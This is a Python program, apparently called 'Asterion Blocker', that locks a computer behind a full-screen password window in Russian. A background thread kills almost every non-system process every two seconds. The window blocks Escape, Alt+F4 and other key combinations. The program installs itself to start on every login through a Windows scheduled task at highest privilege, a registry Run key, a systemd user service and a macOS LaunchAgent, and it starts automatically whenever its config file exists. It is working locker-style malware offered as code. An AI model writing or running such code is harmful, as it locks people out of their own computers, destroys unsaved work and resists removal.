import sys
import os
import json
import hashlib
import platform
import subprocess
import tempfile
import threading
import time
import psutil
from PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton
from PyQt6.QtCore import Qt, QEventLoop
from PyQt6.QtGui import QKeyEvent
import shutil
try:
    import win32com.client
except:
    pass


def _get_config_dir():
    system = platform.system()
    if system == "Windows":
        base = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
        path = os.path.join(base, "Asterion")
    elif system == "Darwin":
        path = os.path.expanduser("~/Library/Application Support/Asterion")
    else:
        path = os.path.expanduser("~/.config/asterion")
    os.makedirs(path, exist_ok=True)
    return path


CONFIG_DIR = _get_config_dir()
CONFIG_PATH = os.path.join(CONFIG_DIR, "blocker_config.json")
CONFIG_BACKUP_PATH = os.path.join(CONFIG_DIR, "blocker_config.json.bak")


def _atomic_write_json(path, data):
    dir_path = os.path.dirname(path)
    fd, tmp_path = tempfile.mkstemp(dir=dir_path, suffix=".tmp")
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(data, f)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_path, path)
        fd = -1
    except Exception:
        if fd != -1:
            try:
                os.close(fd)
            except:
                pass
        if os.path.exists(tmp_path):
            try:
                os.remove(tmp_path)
            except:
                pass
        raise


def _safe_read_json(path, default=None):
    for try_path in [path, CONFIG_BACKUP_PATH]:
        if not os.path.exists(try_path):
            continue
        try:
            with open(try_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError):
            continue
    return default


_singleton_lock_fd = None

def _acquire_singleton_lock():
    global _singleton_lock_fd
    if platform.system() == "Windows":
        return True
    lock_path = os.path.join(CONFIG_DIR, "singleton.lock")
    try:
        fd = os.open(lock_path, os.O_CREAT | os.O_RDWR)
        import fcntl
        fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _singleton_lock_fd = fd
        return True
    except (IOError, OSError, ImportError):
        try:
            if 'fd' in dir() and fd is not None:
                os.close(fd)
        except Exception:
            pass
        return False


class ProcessKillerThread(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.running = True
        self.current_pid = os.getpid()
        self.ancestors = self._get_ancestors()
        p = psutil.Process(self.current_pid)
        self.self_name = p.name()
        try:
            self.self_exe = p.exe()
        except:
            self.self_exe = ""
        self.whitelist_windows = {
            "system idle process", "system", "registry", "smss.exe", "csrss.exe",
            "wininit.exe", "services.exe", "lsass.exe", "svchost.exe", "winlogon.exe",
            "fontdrvhost.exe", "dwm.exe", "explorer.exe", "taskhostw.exe", "dllhost.exe",
            "conhost.exe", "sihost.exe", "shellexperiencehost.exe", "searchindexer.exe",
            "searchprotocolhost.exe", "searchfilterhost.exe", "runtimebroker.exe",
            "securityhealthservice.exe", "wmiprvse.exe", "wudfhost.exe", "audiodg.exe",
            "spoolsv.exe", "taskmgr.exe", "msmpeng.exe", "nissrv.exe", "mpcmdrun.exe",
            "searchapp.exe", "startmenuexperiencehost.exe", "widgets.exe", "textinputhost.exe",
            "ctfmon.exe", "logonui.exe", "consent.exe", "trustedinstaller.exe", "tiworker.exe",
            "compattelrunner.exe", "backgroundtaskhost.exe", "applicationframehost.exe",
            "browser_broker.exe", "sgrmbroker.exe", "smartscreen.exe", "memory compression",
            "secure system", "vmmem", "vmmemwsl", "vmmemwsa", "crashpad_handler.exe",
            "update.exe", "python.exe", "pythonw.exe", "py.exe", "pyw.exe", "cmd.exe",
            "powershell.exe", "pwsh.exe", "wt.exe", "taskeng.exe", "rundll32.exe",
            "wscript.exe", "cscript.exe", "mshta.exe"
        }
        self.whitelist_linux = {
            "Xorg", "Xwayland", "gnome-shell", "kwin_x11", "kwin_wayland", "plasmashell",
            "xfwm4", "mutter", "cinnamon", "budgie-wm", "i3", "sway", "dwm", "awesome",
            "openbox", "fluxbox", "jwm", "pekwm", "icewm", "lxqt-panel", "lxpanel",
            "mate-panel", "cinnamon-panel", "gnome-keyring-daemon", "kded5", "kded6",
            "kwalletd5", "gdm", "gdm3", "sddm", "lightdm", "slim", "xdm", "plymouthd",
            "agetty", "getty", "login", "xinit", "startx", "systemd", "systemd-journald",
            "systemd-logind", "systemd-networkd", "systemd-resolve", "systemd-timesync",
            "systemd-udevd", "dbus-daemon", "dbus-broker", "dbus-launch", "networkmanager",
            "wpa_supplicant", "dhclient", "dhcpcd", "avahi-daemon", "cups", "cups-browsed",
            "polkitd", "rtkit-daemon", "pulseaudio", "pipewire", "pipewire-pulse", "wireplumber",
            "cron", "atd", "anacron", "rsyslogd", "syslog-ng", "sshd", "acpid", "irqbalance",
            "haveged", "rngd", "smartd", "thermald", "tlp", "powertop", "upowerd", "udisksd",
            "gvfsd", "dconf-service", "at-spi-bus-launcher", "at-spi2-registryd", "xsettingsd",
            "gnome-settings-daemon", "kactivitymanagerd", "kscreen_backend_launcher", "ksmserver",
            "kwin", "kaccess", "kglobalaccel5", "kglobalaccel6", "knotify4", "knotify5", "knotify6",
            "plasma-desktop", "plasma-workspace", "latte-dock", "tint2", "polybar", "lemonbar",
            "xmobar", "i3bar", "i3status", "dunst", "mako", "swaync", "deadd-notification-center",
            "xfce4-notifyd", "mate-notification-daemon", "notification-daemon", "notify-osd",
            "volnoti", "pa-applet", "volumeicon", "pnmixer", "parcellite", "clipit", "diodon",
            "copyq", "clipmenu", "greenclip", "xclip", "xsel", "autocutsel", "ulauncher", "albert",
            "krunner", "synapse", "mutter-x11-frames", "mutter-wayland-frames", "gnome-panel",
            "gnome-flashback", "metacity", "marco", "compiz", "beryl", "emerald", "fusion-icon",
            "cairo-dock", "docky", "awn-applet", "avant-window-navigator", "plank", "dockbarx",
            "fbpanel", "lxpanelx", "pypanel", "bmpanel2", "perlpanel", "fspanel", "gnome-pie",
            "slingshot", "wingpanel", "conky", "conky-cli", "python3", "python", "python2", "py",
            "sh", "bash", "dash", "zsh", "fish", "ksh", "tcsh", "csh", "ash", "hush", "yash",
            "rc", "es", "scsh", "xonsh", "nu", "elvish", "oil", "oh", "ngs", "murex", "nushell",
            "pwsh", "powershell", "cmd", "explorer.exe", "cmd.exe", "conhost.exe", "init",
            "appimaged", "AppImageLauncher", "fuse-overlayfs", "fusermount", "snapfuse"
        }
        self.whitelist_darwin = {
            "WindowServer", "loginwindow", "Dock", "Finder", "SystemUIServer", "Spotlight",
            "Terminal", "iTerm2", "iTermServer", "tmux", "screen", "kernel_task", "launchd",
            "syslogd", "UserEventAgent", "uninstalld", "kextd", "fseventsd", "mediaremoted",
            "bluetoothd", "configd", "coreaudiod", "powerd", "securityd", "mds", "mds_stores",
            "distnoted", "cfprefsd", "cloudd", "bird", "nsurlsessiond", "trustd", "secd", "akd",
            "hidd", "coreservicesd", "notifyd", "diskarbitrationd", "opendirectoryd",
            "iconservicesagent", "iconservicesd", "fileproviderd", "filecoordinationd",
            "backgroundtaskmanagementagent", "backgroundtaskmanagementd", "thermalmonitord",
            "powerdatad", "remotemanagementd", "appleeventsd", "audiord", "avconferenced",
            "backboardd", "biometrickitd", "bluetoothaudiod", "calaccessd", "callservicesd",
            "cameracaptured", "containermanagerd", "contextstored", "coreauthd", "corebrightnessd",
            "coredatad", "coreduetd", "coresymbolicationd", "dasd", "diagnosticd", "dmd", "dprivacyd",
            "duetexpertd", "familycircled", "familynotificationd", "findmydeviced", "fmfd",
            "fmflocatord", "followupd", "fpsd", "gamecontrollerd", "geod", "homed",
            "identityservicesd", "imagent", "installd", "iohideventsystem", "kdc", "kperf",
            "locationd", "lockdownd", "mDNSResponder", "maild", "mapspushd", "mobileactivationd",
            "mobileassetd", "mobileinstallationproxy", "mobiletimerd", "neagent", "nehelper",
            "nesessionmanager", "netbiosd", "networkserviceproxy", "ntpd", "ocspd", "passd",
            "pboard", "pkd", "pluginkit", "proactiveeventtrackerd", "ptpd", "racoon", "rapportd",
            "remindd", "routined", "rtcreportingd", "runningboardd", "securityd_service",
            "sharingd", "signpost_reporter", "sirittsd", "smbd", "socialpushagent", "softwareupdated",
            "spindump", "splashboardd", "springboard", "storeassetd", "storedownloadd",
            "storekitagent", "storelegacy", "suhelperd", "symptomsd", "sysdiagnose",
            "system_installd", "systemsoundserverd", "timed", "tipsd", "ubd", "usermanagerd",
            "vindicate", "vsvcp", "wifianalyticsd", "wifip2pd", "wirelessproxd",
            "xartstorageremoted", "xpcproxy", "xpcroleaccountd", "zsh", "bash", "sh", "python3",
            "python", "login", "sshd", "fish", "tcsh", "csh", "ksh", "dash", "nu", "xonsh",
            "elvish", "nushell"
        }
        self.system_paths_linux = ("/usr/sbin/", "/sbin/", "/usr/lib/", "/lib/", "/usr/libexec/")
        self.system_paths_darwin = ("/System/", "/usr/sbin/", "/sbin/", "/usr/libexec/", "/usr/lib/")

    def _get_ancestors(self):
        ancestors = set()
        try:
            pid = os.getpid()
            while True:
                try:
                    p = psutil.Process(pid)
                    ancestors.add(pid)
                    pid = p.ppid()
                    if pid == 0 or pid in ancestors:
                        break
                except:
                    break
        except:
            pass
        return ancestors

    def run(self):
        while self.running:
            try:
                system = platform.system()
                if system == "Windows":
                    self._kill_windows()
                elif system == "Linux":
                    self._kill_linux()
                elif system == "Darwin":
                    self._kill_darwin()
            except:
                pass
            time.sleep(2)

    def _is_system_windows(self, proc):
        try:
            pid = proc.pid
            if pid == self.current_pid or pid in self.ancestors:
                return True
            name = proc.name().lower()
            if name == self.self_name.lower():
                return True
            if name in self.whitelist_windows:
                return True
            try:
                exe = proc.exe()
                if exe:
                    exe_lower = exe.lower()
                    if exe_lower == self.self_exe.lower():
                        return True
                    if "system32" in exe_lower or "syswow64" in exe_lower or "winsxs" in exe_lower:
                        return True
            except:
                pass
            return False
        except:
            return True

    def _is_system_linux(self, proc):
        try:
            pid = proc.pid
            if pid == self.current_pid or pid in self.ancestors:
                return True
            name = proc.name()
            if name == self.self_name:
                return True
            if name in self.whitelist_linux:
                return True
            try:
                exe = proc.exe()
                if not exe:
                    return True
                if exe == self.self_exe:
                    return True
                if exe.startswith(self.system_paths_linux):
                    return True
                uids = proc.uids()
                if uids.real == 0:
                    return True
            except:
                pass
            try:
                exe = proc.exe()
                if not exe:
                    return True
            except:
                return True
            return False
        except:
            return True

    def _is_system_darwin(self, proc):
        try:
            pid = proc.pid
            if pid == self.current_pid or pid in self.ancestors:
                return True
            name = proc.name()
            if name == self.self_name:
                return True
            if name in self.whitelist_darwin:
                return True
            try:
                exe = proc.exe()
                if exe:
                    if exe == self.self_exe:
                        return True
                    if exe.startswith(self.system_paths_darwin):
                        return True
                uids = proc.uids()
                if uids.real == 0:
                    return True
            except:
                pass
            return False
        except:
            return True

    def _kill_windows(self):
        for proc in psutil.process_iter(["pid", "name"]):
            try:
                if self._is_system_windows(proc):
                    continue
                p = psutil.Process(proc.info["pid"])
                p.kill()
            except:
                pass

    def _kill_linux(self):
        for proc in psutil.process_iter(["pid", "name", "exe", "uids"]):
            try:
                if self._is_system_linux(proc):
                    continue
                p = psutil.Process(proc.info["pid"])
                p.kill()
            except:
                pass

    def _kill_darwin(self):
        for proc in psutil.process_iter(["pid", "name", "exe", "uids"]):
            try:
                if self._is_system_darwin(proc):
                    continue
                p = psutil.Process(proc.info["pid"])
                p.kill()
            except:
                pass

    def stop(self):
        self.running = False


class BlockerWindow(QWidget):
    def __init__(self, password_hash, killer=None):
        super().__init__()
        self.password_hash = password_hash
        self.killer = killer
        self.loop = None
        self.setup_ui()

    def setup_ui(self):
        self.setWindowFlags(
            Qt.WindowType.FramelessWindowHint |
            Qt.WindowType.WindowStaysOnTopHint |
            Qt.WindowType.Tool
        )
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, False)

        screen = QApplication.primaryScreen().geometry()
        self.setGeometry(screen)

        self.setStyleSheet("""
            QWidget { background-color: #1a1a1a; }
            QLabel { color: #ffffff; font-size: 24px; font-weight: bold; }
            QLineEdit {
                background-color: #3d3d3d;
                border: 2px solid #5a5a6a;
                border-radius: 8px;
                padding: 15px;
                color: #ffffff;
                font-size: 20px;
                min-width: 300px;
            }
            QLineEdit:focus { border: 2px solid #c0392b; }
            QPushButton {
                background-color: #c0392b;
                border: none;
                border-radius: 8px;
                padding: 15px 40px;
                color: #ffffff;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #e74c3c; }
            QPushButton:pressed { background-color: #a93226; }
        """)

        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.setSpacing(20)

        warning = QLabel("ДОСТУП ОГРАНИЧЕН")
        warning.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(warning)

        sub = QLabel("Введите пароль администратора для разблокировки")
        sub.setStyleSheet("color: #8a8a9a; font-size: 16px; font-weight: normal;")
        sub.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(sub)

        self.pass_input = QLineEdit()
        self.pass_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.pass_input.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pass_input.returnPressed.connect(self.check_password)
        layout.addWidget(self.pass_input)

        btn = QPushButton("РАЗБЛОКИРОВАТЬ")
        btn.clicked.connect(self.check_password)
        layout.addWidget(btn)

        self.setLayout(layout)

    def showEvent(self, event):
        super().showEvent(event)
        self.activateWindow()
        self.raise_()
        self.pass_input.setFocus()

    def check_password(self):
        entered = self.pass_input.text().strip()
        if hashlib.sha256(entered.encode("utf-8")).hexdigest() == self.password_hash:
            if os.path.exists(CONFIG_PATH):
                try:
                    os.remove(CONFIG_PATH)
                except:
                    pass
            if os.path.exists(CONFIG_BACKUP_PATH):
                try:
                    os.remove(CONFIG_BACKUP_PATH)
                except:
                    pass
            if self.killer:
                self.killer.stop()
            if self.loop and self.loop.isRunning():
                self.loop.quit()
            self.close()
            sys.exit()
        else:
            self.pass_input.clear()
            self.pass_input.setPlaceholderText("Неверный пароль")
            self.pass_input.setFocus()

    def keyPressEvent(self, event):
        if event.key() == Qt.Key.Key_Escape:
            return
        if event.modifiers() & Qt.KeyboardModifier.AltModifier and event.key() == Qt.Key.Key_F4:
            return
        if event.modifiers() & Qt.KeyboardModifier.ControlModifier and event.modifiers() & Qt.KeyboardModifier.AltModifier:
            return
        if event.modifiers() & Qt.KeyboardModifier.MetaModifier:
            return
        super().keyPressEvent(event)


def _setup_windows_persistence(script_path):
    exe_path = sys.executable
    if exe_path.endswith(".py") or exe_path.endswith(".pyw"):
        exe_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        if not os.path.exists(exe_path):
            exe_path = sys.executable

    task_created = False

    try:
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")

        task_def = scheduler.NewTask(0)
        reg_info = task_def.RegistrationInfo
        reg_info.Description = "Asterion Blocker - System Lockdown"
        reg_info.Author = "Asterion"

        triggers = task_def.Triggers
        trigger = triggers.Create(9)
        trigger.Enabled = True

        action = task_def.Actions.Create(0)
        action.Path = exe_path
        action.Arguments = f'"{script_path}"'
        action.WorkingDirectory = os.path.dirname(script_path)

        settings = task_def.Settings
        settings.Enabled = True
        settings.StartWhenAvailable = True
        settings.Hidden = False
        settings.AllowHardTerminate = True
        settings.RestartCount = 3
        settings.RestartInterval = "PT1M"

        principal = task_def.Principal
        principal.RunLevel = 1

        root_folder.RegisterTaskDefinition(
            "AsterionBlocker",
            task_def,
            6,
            "",
            "",
            3
        )
        task_created = True
    except Exception:
        pass

    if not task_created:
        try:
            subprocess.run([
                "schtasks", "/create", "/tn", "AsterionBlocker", "/tr",
                f'"{exe_path}" "{script_path}"',
                "/sc", "onlogon", "/rl", "highest", "/f"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            task_created = True
        except:
            pass

    if not task_created:
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "AsterionBlocker", 0, winreg.REG_SZ,
                            f'"{exe_path}" "{script_path}"')
            winreg.CloseKey(key)
        except:
            pass


def _setup_linux_persistence(script_path):
    systemd_dir = os.path.expanduser("~/.config/systemd/user")
    os.makedirs(systemd_dir, exist_ok=True)
    service_path = os.path.join(systemd_dir, "asterion-blocker.service")

    service_content = f"""[Unit]
Description=Asterion Blocker
After=graphical-session.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=on-failure
RestartSec=10

[Install]
WantedBy=default.target
"""
    need_update = True
    if os.path.exists(service_path):
        try:
            with open(service_path, 'r', encoding='utf-8') as f:
                if f.read().strip() == service_content.strip():
                    need_update = False
        except:
            pass

    if need_update:
        try:
            with open(service_path, 'w', encoding='utf-8') as f:
                f.write(service_content)
            subprocess.run(
                ["systemctl", "--user", "daemon-reload"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
            )
        except:
            pass
    try:
        result = subprocess.run(
            ["systemctl", "--user", "is-enabled", "asterion-blocker"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if result.returncode != 0:
            subprocess.run(
                ["systemctl", "--user", "enable", "asterion-blocker"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
            )
    except:
        pass
    desktop_path = os.path.join(os.path.expanduser("~/.config/autostart"), "asterion-blocker.desktop")
    if os.path.exists(desktop_path):
        try:
            os.remove(desktop_path)
        except:
            pass
    old_cron_script = os.path.expanduser("~/.config/asterion/cron_backup.sh")
    if os.path.exists(old_cron_script):
        try:
            os.remove(old_cron_script)
        except:
            pass
    try:
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        if result.returncode == 0:
            lines = result.stdout.splitlines()
            new_lines = [line for line in lines
                        if "asterion" not in line.lower() and "cron_backup.sh" not in line]
            new_cron = "\n".join(new_lines)
            if new_cron:
                new_cron += "\n"
            if new_cron != result.stdout:
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new_cron)
    except:
        pass


def _setup_darwin_persistence(script_path):
    plist_dir = os.path.expanduser("~/Library/LaunchAgents")
    os.makedirs(plist_dir, exist_ok=True)
    plist_path = os.path.join(plist_dir, "com.asterion.blocker.plist")

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.asterion.blocker</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>ThrottleInterval</key>
    <integer>10</integer>
</dict>
</plist>"""

    need_update = True
    if os.path.exists(plist_path):
        try:
            with open(plist_path, 'r', encoding='utf-8') as f:
                if f.read().strip() == plist_content.strip():
                    need_update = False
        except:
            pass

    if need_update:
        try:
            with open(plist_path, 'w', encoding='utf-8') as f:
                f.write(plist_content)
        except:
            pass
    try:
        subprocess.run(
            ["launchctl", "unload", plist_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.run(
            ["launchctl", "load", plist_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
        )
    except:
        pass
    old_cron_script = os.path.expanduser("~/.asterion_blocker.sh")
    if os.path.exists(old_cron_script):
        try:
            os.remove(old_cron_script)
        except:
            pass
    try:
        result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
        if result.returncode == 0:
            lines = result.stdout.splitlines()
            new_lines = [line for line in lines
                        if "asterion" not in line.lower() and ".asterion_blocker.sh" not in line]
            new_cron = "\n".join(new_lines)
            if new_cron:
                new_cron += "\n"
            if new_cron != result.stdout:
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new_cron)
    except:
        pass


def setup_persistence():
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    if system == "Windows":
        _setup_windows_persistence(script_path)
    elif system == "Linux":
        _setup_linux_persistence(script_path)
    elif system == "Darwin":
        _setup_darwin_persistence(script_path)


def run_blocker(password_hash=None, killer=None):
    if not _acquire_singleton_lock():
        sys.exit(0)

    if password_hash is None or password_hash == "":
        config = _safe_read_json(CONFIG_PATH, {})
        if not config:
            config = _safe_read_json(CONFIG_BACKUP_PATH, {})
        password_hash = config.get("password_hash", "")
        if not password_hash:
            return
    data = {"password_hash": password_hash}
    _atomic_write_json(CONFIG_PATH, data)
    try:
        shutil.copy2(CONFIG_PATH, CONFIG_BACKUP_PATH)
    except:
        pass
    setup_persistence()
    if killer is None:
        killer = ProcessKillerThread()
        killer.start()
    app = QApplication.instance() or QApplication(sys.argv)
    window = BlockerWindow(password_hash, killer)
    window.showFullScreen()
    window.raise_()
    window.activateWindow()
    window.pass_input.setFocus()

    loop = QEventLoop()
    window.loop = loop
    loop.exec()

    window.deleteLater()


if os.path.exists(CONFIG_PATH) or os.path.exists(CONFIG_BACKUP_PATH):
    config = _safe_read_json(CONFIG_PATH, {})
    if not config:
        config = _safe_read_json(CONFIG_BACKUP_PATH, {})
    password_hash = config.get("password_hash", "")
    if password_hash:
        run_blocker(password_hash)